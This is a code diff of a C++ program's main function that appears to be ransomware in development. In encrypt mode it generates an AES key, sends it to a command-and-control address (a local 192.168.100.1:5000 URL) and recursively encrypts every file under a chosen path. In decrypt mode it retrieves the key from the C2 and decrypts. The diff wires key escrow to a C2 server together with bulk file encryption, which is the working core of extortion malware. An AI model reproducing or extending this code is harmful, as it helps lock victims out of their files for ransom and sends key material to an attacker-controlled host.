@@ -7,12 +7,6 @@
 int main(int argc, char *argv[]) {
     AES256CBC AES;
     AES.C2Addr = "http://192.168.100.1:5000";
-    AES.keyFromC2("test-b64-in");
-    AES.generateKey();
-    AES.keyToC2("test-b64-out");
-    return 0;
-
-
 
     std::string option;
     while (option != "e" and option != "d") {
@@ -34,10 +28,14 @@ int main(int argc, char *argv[]) {
     std::cout << "[i] Working within " << path << "\n";
     //AES.isLogging = false;;
 
-    if (option == "e")
+    if (option == "e") {
+        AES.generateKey();
+        AES.keyToC2("test-b64-in");
         AES.encryptRecursively(path);
-    else
+    } else {
+        AES.keyFromC2("test-b64-in");
         AES.decryptRecursively(path);
+    }
 
     return 0;
 }
